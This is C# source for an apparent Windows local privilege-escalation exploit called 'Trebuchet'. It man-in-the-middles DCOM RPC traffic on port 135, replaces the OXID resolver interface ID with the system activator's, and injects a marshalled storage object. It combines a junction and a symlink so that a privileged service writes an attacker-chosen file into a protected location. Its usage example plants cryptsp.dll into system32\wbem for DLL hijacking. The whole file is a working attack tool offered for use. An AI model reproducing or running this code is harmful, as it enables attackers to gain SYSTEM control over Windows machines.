﻿using Microsoft.VisualStudio.OLE.Interop;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Trebuchet
{   
    class Program
    {        
        class RpcHeader
        {
            public byte MajorVersion;
            public byte MinorVersion;
            public byte PacketType;
            public byte PacketFlags;
            public uint DataRepresentation;
            public ushort FragLength;
            public ushort AuthLength;
            public uint CallId;
            public byte[] Data;
            public byte[] AuthData;

            public static RpcHeader FromStream(BinaryReader reader)
            {
                RpcHeader header = new RpcHeader();
                header.MajorVersion = reader.ReadByte();
                header.MinorVersion = reader.ReadByte();
                header.PacketType = reader.ReadByte();
                header.PacketFlags = reader.ReadByte();
                header.DataRepresentation = reader.ReadUInt32();
                header.FragLength = reader.ReadUInt16();
                header.AuthLength = reader.ReadUInt16();
                header.CallId = reader.ReadUInt32();

                header.Data = reader.ReadBytes(header.FragLength - header.AuthLength - 16);
                header.AuthData = reader.ReadBytes(header.AuthLength);

                return header;
            }

            public void ToStream(BinaryWriter writer)
            {
                MemoryStream stm = new MemoryStream();
                BinaryWriter w = new BinaryWriter(stm);

                w.Write(MajorVersion);
                w.Write(MinorVersion);
                w.Write(PacketType);
                w.Write(PacketFlags);
                w.Write(DataRepresentation);
                w.Write((ushort)(Data.Length + AuthData.Length + 16));
                w.Write((ushort)AuthData.Length);
                w.Write(CallId);
                w.Write(Data);
                w.Write(AuthData);

                writer.Write(stm.ToArray());
            }
        }

        class RpcContextSplit
        {
            public TcpClient client;
            public BinaryReader clientReader;
            public BinaryWriter clientWriter;
            public TcpClient server;
            public BinaryReader serverReader;
            public BinaryWriter serverWriter;
            public byte[] objref;

            public RpcContextSplit(TcpClient client, TcpClient server)
            {
                this.client = client;
                this.server = server;
                clientReader = new BinaryReader(client.GetStream());
                clientWriter = new BinaryWriter(client.GetStream());
                serverReader = new BinaryReader(server.GetStream());
                serverWriter = new BinaryWriter(server.GetStream());
            }
        }

        static byte[] oxidResolveIID = {
	            0xC4, 0xFE, 0xFC, 0x99, 0x60, 0x52, 0x1B, 0x10, 0xBB, 0xCB, 0x00, 0xAA,
	            0x00, 0x21, 0x34, 0x7A
        };

        static byte[] systemActivatorIID = {
	            0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00,
	            0x00, 0x00, 0x00, 0x46
        };                

        static int FindBytes(byte[] src, int startIndex, byte[] find)
        {
            int index = -1;
            int matchIndex = 0;
            // handle the complete source array
            for (int i = startIndex; i < src.Length; i++)
            {
                if (src[i] == find[matchIndex])
                {
                    if (matchIndex == (find.Length - 1))
                    {
                        index = i - matchIndex;
                        break;
                    }
                    matchIndex++;
                }
                else
                {
                    matchIndex = 0;
                }

            }
            return index;
        }

        static byte[] ReplaceBytes(byte[] src, byte[] search, byte[] repl)
        {
            byte[] dst = null;
            int index = FindBytes(src, 0, search);
            while(index >= 0)
            {            
                //Console.WriteLine("Found Match at {0}", index);
                dst = new byte[src.Length - search.Length + repl.Length];
                // before found array
                Buffer.BlockCopy(src, 0, dst, 0, index);
                // repl copy
                Buffer.BlockCopy(repl, 0, dst, index, repl.Length);
                // rest of src array
                Buffer.BlockCopy(
                    src,
                    index + search.Length,
                    dst,
                    index + repl.Length,
                    src.Length - (index + search.Length));
                src = dst;
                index = FindBytes(src, index + 1, search);
            }
            return dst;
        }

        /// <summary>
        /// Read from the client socket and send to server
        /// </summary>
        /// <param name="o"></param>
        static void ReaderThread(object o)
        {
            RpcContextSplit ctx = (RpcContextSplit)o;
            bool isauth = false;
            bool replacediid = false;

            try
            {
                while (true)
                {
                    RpcHeader header = RpcHeader.FromStream(ctx.clientReader);

                    if (!isauth && header.AuthLength > 0)
                    {
                        isauth = true;
                    }

                    if (isauth)
                    {
                        if (!replacediid)
                        {
                            byte[] b = ReplaceBytes(header.Data, oxidResolveIID, systemActivatorIID);
                            if (b != null)
                            {
                                header.Data = b;
                                replacediid = true;
                            }
                        }
                        else
                        {
                            // Is a RPC request
                            if (header.PacketType == 0)
                            {
                                //Console.WriteLine("Changing activation at localsystem");

                                byte[] actData = Trebuchet.Properties.Resources.request;

                                for (int i = 0; i < ctx.objref.Length; ++i)
                                {
                                    // Replace the marshalled IStorage object
                                    actData[i + 0x368] = ctx.objref[i];
                                }
                                
                                RpcHeader newHeader = RpcHeader.FromStream(new BinaryReader(new MemoryStream(actData)));

                                // Fixup callid
                                newHeader.CallId = header.CallId;

                                header = newHeader;
                            }
                        }
                    }

                    //Console.WriteLine("=> Packet: {0} Data: {1} Auth: {2} {3}", header.PacketType, header.FragLength, header.AuthLength, isauth);

                    header.ToStream(ctx.serverWriter);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

            Console.WriteLine("Stopping Reader Thread");

            ctx.client.Client.Shutdown(SocketShutdown.Receive);
            ctx.server.Client.Shutdown(SocketShutdown.Send);
        }

        static void WriterThread(object o)
        {
            RpcContextSplit ctx = (RpcContextSplit)o;
            try
            {
                while (true)
                {
                    RpcHeader header = RpcHeader.FromStream(ctx.serverReader);

                    //Console.WriteLine("<= Packet: {0} Data: {1} Auth: {2}", header.PacketType, header.FragLength, header.AuthLength);
                    header.ToStream(ctx.clientWriter);
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex);
            }

            Console.WriteLine("Stopping Writer Thread");
            ctx.client.Client.Shutdown(SocketShutdown.Send);
            ctx.server.Client.Shutdown(SocketShutdown.Receive);
        }

        
        const int DUMMY_LOCAL_PORT = 6666;

        static string GenRandomName()
        {
            Random r = new Random();
            StringBuilder builder = new StringBuilder();

            for (int i = 0; i < 8; i++)
            {
                int c = r.Next(26);
                builder.Append((char)('A' + c));
            }

            return builder.ToString();
        }

        static bool CreateJunction(string path, string target)
        {
            string cmdline = String.Format("cmd /c mklink /J {0} {1}", path, target);
            
            ProcessStartInfo si = new ProcessStartInfo("cmd.exe", cmdline);            
            si.UseShellExecute = false;            

            Process p = Process.Start(si);
            p.WaitForExit();

            return p.ExitCode == 0;
        }

        static bool CreateSymlink(string path, string target)
        {
            string cmdline = String.Format("cmd /c C:\\users\\public\\libraries\\createsymlink.exe \"{0}\" \"{1}\"", path, target);

            ProcessStartInfo si = new ProcessStartInfo("cmd.exe", cmdline);
            si.UseShellExecute = false;

            Process symLinkProc = Process.Start(si);
            Thread.Sleep(2000);

            return symLinkProc.HasExited;
        }

        [MTAThread]
        static void DoRpcTest(object o, ref RpcContextSplit ctx, string rock, string castle)
        {
            ManualResetEvent ev = (ManualResetEvent)o;
            TcpListener listener = new TcpListener(IPAddress.Loopback, DUMMY_LOCAL_PORT);
            byte[] rockBytes = null;

            try { rockBytes = File.ReadAllBytes(rock); }
            catch
            {
                Console.WriteLine("[!] Error reading initial file!");
                Environment.Exit(1);
            }

            Console.WriteLine(String.Format("[+] Loaded in {0} bytes.", rockBytes.Length));

            bool is64bit = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
            try
            {
                Console.WriteLine("[+] Getting out our toolbox...");
                if (is64bit)
                {
                    File.WriteAllBytes("C:\\users\\public\\libraries\\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx64);
                }
                else
                {
                    File.WriteAllBytes("C:\\users\\public\\libraries\\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx86);
                }             
            }
            catch
            {
                Console.WriteLine("[!] Error writing to C:\\users\\public\\libraries\\createsymlink.exe!");
                Environment.Exit(1);
            }

            string name = GenRandomName();
            string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

            string tempPath = Path.Combine(windir, "temp", name);
            if (!CreateJunction(tempPath, "\"C:\\users\\public\\libraries\\Sym\\"))
            {
                Console.WriteLine("[!] Couldn't create the junction");
                Environment.Exit(1);
            }

            if (CreateSymlink("C:\\users\\public\\libraries\\Sym\\ (2)", castle)) //Exit bool is inverted!
            {
                Console.WriteLine("[!] Couldn't create the SymLink!");
                Environment.Exit(1);
            }

            IStorage stg = ComUtils.CreatePackageStorage(name, rockBytes);
            byte[] objref = ComUtils.GetMarshalledObject(stg);

            listener.Start();

            ev.Set();

            while (true)
            {
                try
                {
                    TcpClient client = listener.AcceptTcpClient();
                    TcpClient server = new TcpClient("127.0.0.1", 135);

                    //Console.WriteLine("Connected");

                    client.NoDelay = true;
                    server.NoDelay = true;

                    ctx = new RpcContextSplit(client, server);
                    ctx.objref = objref;

                    Thread t = new Thread(ReaderThread);                   
                    t.IsBackground = true;
                    t.Start(ctx);

                    t = new Thread(WriterThread);
                    t.IsBackground = true;
                    t.Start(ctx);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
        }

        static void Main(string[] args)
        {            
            try
            {
                ManualResetEvent e = new ManualResetEvent(false);

                RpcContextSplit ctx = null; 

                if (args.Length < 2)
                {
                    Console.WriteLine("[+] Usage: Trebuchet [startFile] [destination]");
                    Console.WriteLine("    Example: Trebuchet C:\\users\\public\\libraries\\cryptsp.dll C:\\windows\\system32\\wbem\\cryptsp.dll");
                    System.Environment.Exit(1);
                }

                string rock = args[0];
                string castle = args[1];

                Thread t = new Thread(() => DoRpcTest(e, ref ctx, rock, castle));

                t.IsBackground = true;
                t.Start();
                e.WaitOne();
                try
                {
                    ComUtils.BootstrapComMarshal(DUMMY_LOCAL_PORT);
                }
                catch
                {
                    Console.WriteLine("[+] We Broke RPC! (Probably a good thing)");
                }

                Process symLinkProc  = null;
                foreach (var process in Process.GetProcessesByName("CreateSymlink"))
                {
                    symLinkProc = process;
                    break;
                }
                Console.WriteLine("[+] Waiting for CreateSymlink to close...");
                symLinkProc.WaitForExit();
                Console.WriteLine("[+] Cleaning Up!");
                try {
                    File.Delete("C:\\users\\public\\libraries\\CreateSymlink.exe");
                }catch{
                    Console.WriteLine("[!] Failed to delete C:\\users\\public\\libraries\\CreateSymlink.exe");
                }
                ctx.client.Client.Shutdown(SocketShutdown.Send);
                ctx.server.Client.Shutdown(SocketShutdown.Receive);
            }
            catch (Exception ex)
            {
               Console.WriteLine(ex);
            }

            
        }
    }
}
